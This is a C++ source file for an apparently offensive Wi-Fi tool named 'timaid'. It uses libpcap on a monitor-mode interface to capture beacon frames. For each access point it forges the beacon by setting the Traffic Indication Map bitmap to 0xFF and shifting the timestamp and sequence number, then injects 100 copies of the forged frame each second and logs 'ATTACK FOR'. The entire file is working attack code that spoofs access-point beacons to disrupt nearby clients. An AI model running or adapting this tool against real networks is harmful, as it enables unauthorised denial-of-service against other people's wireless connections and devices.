#include <cassert>
#include <cstdio>
#include <chrono>
#include <map>

#include <unistd.h>
#include <pcap.h>
#include "radiotap.h"
#include "beacon.h"
#include "gtrace.h"

typedef std::chrono::high_resolution_clock::time_point Clock;
typedef std::chrono::high_resolution_clock::duration Diff;
typedef std::chrono::high_resolution_clock Timer;

typedef std::map<Mac, Clock> AttackMap;
AttackMap attackMap;

void usage() {
	printf("syntax: timaid <interface>\n");
	printf("sample: timaid mon0\n");
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		usage();
		return -1;
	}

	gtrace_close();
	gtrace_open(nullptr, 0, true, nullptr);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, -1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}
	if (argc >= 3) {
		char* filter = argv[2];
		u_int uNetMask= 0xFFFFFFFF;
		bpf_program code;

		int res = pcap_compile(handle, &code, filter, 1, uNetMask);
		if (res < 0) {
			fprintf(stderr, "pcap_compile return %d - %s\n", res, pcap_geterr(handle));
			return -1;
		}

		res = pcap_setfilter(handle, &code);
		if (res < 0) {
			fprintf(stderr, "pcap_setfilter return %d - %s\n", res, pcap_geterr(handle));
			return -1;
		}
	}

	Timer timer;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		if (header->caplen < sizeof(RadiotapHdr)) {
			GTRACE("too small size %u\n", header->caplen);
			continue;
		}
		RadiotapHdr* radiotapHdr = PRadiotapHdr(packet);
		BeaconHdr* beaconHdr = PBeaconHdr(packet + radiotapHdr->len_);
		if (beaconHdr->typeSubtype() != Dot11Hdr::Beacon) continue;

		//GTRACE("radio len=%d caplen=%u\n", radiotapHdr->len_, header->caplen);
		u_char* end = const_cast<u_char*>(packet);
		end += header->caplen;

		BeaconHdr::TaggedParameters::Tag* tag = &beaconHdr->tagged_.tag_;
		while ((void*)tag < (void*)end) {
			if (tag->num_ == BeaconHdr::tagTrafficIndicationMap) {
				BeaconHdr::TrafficIndicationMap* tim = BeaconHdr::PTrafficIndicationMap(tag);

				le8_t bitmap = tim->bitmap_;
				if (bitmap == 0xFF) {
					//GTRACE("bitmap=0x%X\n", tim->bitmap_);
					break;
				}
				bool attack = true;
				Clock now = timer.now();
				Mac bssid = beaconHdr->bssid();
				AttackMap::iterator it = attackMap.find(bssid);
				if (it == attackMap.end()) {
					attackMap.insert({bssid, now});
					it = attackMap.find(bssid);
					assert(it != attackMap.end());
				} else {
					Clock last = it->second;
					Diff diff = now - last;
					//GTRACE("diff=%lu\n", diff.count());
					if (diff.count() < 1000000000) // 1 sec
						attack = false;
				}
				if (attack) {
					GTRACE("ATTACK FOR %s\n", std::string(bssid).c_str());
					le16_t seq = beaconHdr->seq_;
					le64_t timestamp = beaconHdr->fixed_.timestamp_;
					beaconHdr->seq_ = seq + 1;
					static __useconds_t timstampIncment = 100000; // 100 msec
					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment); // gilgil temp
					tim->bitmap_ = 0xFF;
					usleep(timstampIncment - 10000); // -10 msec
					for (int i = 0; i < 100; i++) {
						beaconHdr->fixed_.timestamp_ = timestamp + 1000; // gilgil temp
						int res = pcap_sendpacket(handle, packet, header->caplen);
						if (res != 0) {
							fprintf(stderr, "pacp_sendpacket return %d - %s\n", res, pcap_geterr(handle));
						}
						usleep(100); // 0.1 msec
					}
					it->second = now;
				}
				break;

			}
			tag = tag->next();
		}
	}

	pcap_close(handle);
}
